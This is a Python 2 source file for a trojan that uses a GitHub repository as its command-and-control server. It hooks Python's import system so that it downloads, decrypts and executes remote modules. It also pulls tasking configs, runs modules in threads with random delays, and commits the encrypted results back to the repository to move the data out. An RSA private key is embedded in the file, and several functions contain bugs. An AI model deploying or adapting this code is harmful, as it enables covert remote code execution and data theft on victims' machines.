#!/usr/bin/python

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import github3
import lib_crypto as RSA

# -------- Configuration ---------- #
VERBOSE=False
code_private_key="""-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4BI+2xzBqLJivdx0i5zm85o+s6tCqU04sV1dDnKksZXgdb3I
hbsGR3DQh3zjfbu9dPregI9hNq6z53uvOYTu/SRPQlcJwHujWpCUIUGP4c3qk/R8
s2Oegq1jBznCazrwZ5QpMyBf3Yu4aYw9FUrqwxkW9kc7jXhUB8eMCKttkUcCEbHH
dIKkBK/6LuQOrHCn/9gFOOymRYQdlk5MDXx9vDTXiqMTuE8Sk7M2s8WKOysrX2yX
VF0TQrkBnibslrsMFjJgus2M8+la3sx6zBDDDlQIxnsU9Le7Z2J4eHMqzBfSRc/8
l4LAPtlXQg8Ju6OSqipRzW4lpnqYb60ieGaorwIDAQABAoIBADRcrymfD7ZvcVmy
8d1KXkIhEnQEGoDb1drE2aEts0T4pEp/fiOaL/5z45c13Sedvslecq6SUwJnUw1O
PwVvBjZLzOXQ1yuO+P6J+MPIwWngJ+hJYva82ebpw9GFcuSCEnnyCqqy7xQjuYWY
yxF1v2S2MUJ+JPGLY/+pZxUDkog3IsV/2HBLI/LX3TYUYwzkFHpCejGmXsSbOjeN
CQRuReGr+vHkOnlAzsLDrp4/VZZoebJEV5DFH32AAIj07kOKY4extsz5mm7LWpig
NAYREhftJLHwpGcF/NgAByME2tRu5yv4aSJFGRrAZJG4xpCD7xNAtjpYSHgfWrmx
pGestIkCgYEA5sEUujMM2Ap6Otbpgcg8Cx6vkJ7iYz0maU1/PyneUp19itXWmEQt
xRAd2EmT3X++AsUICRCDJNaIcPi8Cb5pmFstt///Q/1zg48+UryP2XDfaErknkst
YQLRJiAnv00nSGsGOjwhOj4sWp31BDUuuj1s1gekVKRSZpXE5N9c9R0CgYEA+JX9
YpHrZ2qXoiAsAn992sWYPfkPHn4gtjolHBNrcq442iw+7Zi/1WtWoO1yLuJn/eHZ
/GLDguWv/N0oCV3dfpglMjiVj+FrPJ/k3cnZEXLPXZ5q4VBKBE6488AVB513gdVP
96KRqIGYWrs/PhYJEd+QPjD14ci94sTKCKdx5zsCgYA8IZh7JQ51xdUwPAzBayJq
a2aosx6fabH2wuEj3o82zB+I7ExthWa/8YE1eYb0s3MaWanMYucp1FXdypOFnn75
2tjBGA628vcFE3DUMprxuL4e+VU2ArUikI9b9gklir9v2aPXzQ+Dk+wO+RZ+MDWr
BpKz+23ROLjYTrLuSV556QKBgQC+uQVhXSdJfyS7xQc/G2YKNdQqqC4LbSXX6iCS
u+uSX01LRus5DBsSuXoLmmIiyp6S0XeYBoaOpX8y+NNA7H2GJWFUeMl3TLIkH2FP
MRCULIwg/exu1lUTnPqWOWdpIk2QlYL3MgmjSVsFMejBz9JBnk9jB9l+06+sjuOb
ZC0mBQKBgEivm/d5OfCiCBXSuqD0/KMVQKHKsIAg7f/1xgM58tlBryT9M6o6FqWY
XplsAj8W62HHViXuit3tOcRq92D+PHJIJlEAJZG+VZ5jEIIEJYzEe72x8m7D9E85
3MuWeRQ6uDZAYTvWmyZ33H/YHhEhelu4QPioNvR4FXPJtuwjFKUM
-----END RSA PRIVATE KEY-----"""

# -------- Variabels ---------- #
trojan_id = ""
trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_module = []
configured = False
config = None
task_queue = Queue.Queue()
data_public_key=""
code_public_key=""
class GitImporter(object):
    def __init__(self):
        self.current_module_code=""
    
    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attemtping to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)
            
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
            return None
    
    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        
        return module

def random_hex_string():
    hex_string = str(hex(random.randint(0x10000000,0xFFFFFFFF))).upper()[2:10]
    
    return hex_string

def connect_to_github():
    gh = login(username="username", password="password")
    repo = gh.repository("username","trojan")
    branch = repo.branch("master")
    
    return gh, repo, branch

def get_file_contents(filepath):
    
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filepath.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha']).content.read()
            content = RSA.decrypt(blob, code_private_key, VERBOSE)
            return content
    return None

def get_trojan_config():
    global configured
    global config
    
    # Search for remote config file
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if trojan_id in filename.path:
            configured = True
    
    # If not found generate and save        
    if not configured:
        generate_trojan_config(gh, repo, branch)
    
    # Load config file
    trojan_config = "config/%s.json" % trojan_id        
    config_json = get_file_contents(trojan_config)
    config = json.load(base64.b64decode(config_json))
    configured = True
    
    for task in config:
        if 'module' in task:
            if task['module'] not in sys.modules:
                exec ("import %s" % task['module'])
            
    return config

def generate_trojan_config(gh, repo, branch):
    global configured   
    
    config_json = "config/%s.json" % trojan_id

    # Generate default config file
    buffer_json = get_file_contents("config/default_config.json")
    buffer = base64.b64decode(buffer_json)
    print "[*] Generated configuration: %s" % config_json
    commit_message = "Generated configuration: %s" % config_json
    # Save config file in config folders
    repo.create_file(config_json,commit_message,base64.b64encode(RSA.encrypt_string(buffer,code_public_key, VERBOSE))) 
                  
    return True 

def check_trojan_id():
    global trojan_id
    global configured
    
    configured = False
    found_id = False
     
    # Check for ID file
    for file in os.listdir("."):
        if "id" in file:
            found_id = True
    
    if found_id:
        with open('id') as file_object:
            trojan_id = file_object.read().rstrip()
            print "[*] Found ID (%s)" % trojan_id
            file_object.close()
    else:
        # Generate and save ID
        trojan_id = random_hex_string()
        print "[*] Generating and saving ID (%s)" % trojan_id
        with open('id', 'w') as file_object:
            file_object.write("%s" % trojan_id)
            file_object.close()
     
    return trojan_id

def store_module_result(data):
    global data_public_key
    
    gh, repo, branch = connect_to_github()
    data_public_key=get_file_contents("/config/data_key.pub")
    data = RSA.encrypt_string(data, data_public_key, VERBOSE)
    
    tm_year =  time.gmtime(time.time())[0]
    tm_mon =  time.gmtime(time.time())[1]
    tm_mday =  time.gmtime(time.time())[2]
    tm_hour =  time.gmtime(time.time())[3]
    tm_min =  time.gmtime(time.time())[4]
    tm_sec =  time.gmtime(time.time())[5]
    
    date = "%s-%s-%s_%s-%s-%s" % (tm_year, tm_mon, tm_mday, tm_hour, tm_min, tm_sec)
    
    remote_path = "data/%s/%s_%s.data" % (trojan_id, module, date)
   
    commit_message = "Upload Data: %s_%s from ID: %s" % (module, date, trojan_id)
    
    repo.create_file(remote_path,commit_message,base64.b64encode(data))
    
    return True
        
def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    
    store_module_result(result)
    
    return

# !------ Main Loop ------! #
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        code_public_key=get_file_contents("config/code_key.pub")
        # Check if Trojan has an unique ID
        check_trojan_id()
        config = get_trojan_config()
        
        ## Task = Run
        if config[0]['task'] == 'run':
            for task in config:
                if 'module' in task:
                    t = threading.Thread(target=module_runner, args=(task['module'],))
                    t.start()
                    time.sleep(random.randint(1,10))
                    
        ## Task = Kill
        if config[0]['task'] == 'kill':
            print "[!!!] Trojan kill itself"
            sys.exit(1)
         
        ## Task = Pause
        if config[0]['task'] == 'pause':
            print "[?] Trojan is in pause mode"
                    
    task_pause = random.randint(config[0]['task_pause_min'],config[0]['task_pause_max'])
    print "[*] Waiting for %s seconds" % task_pause
    time.sleep(task_pause)
    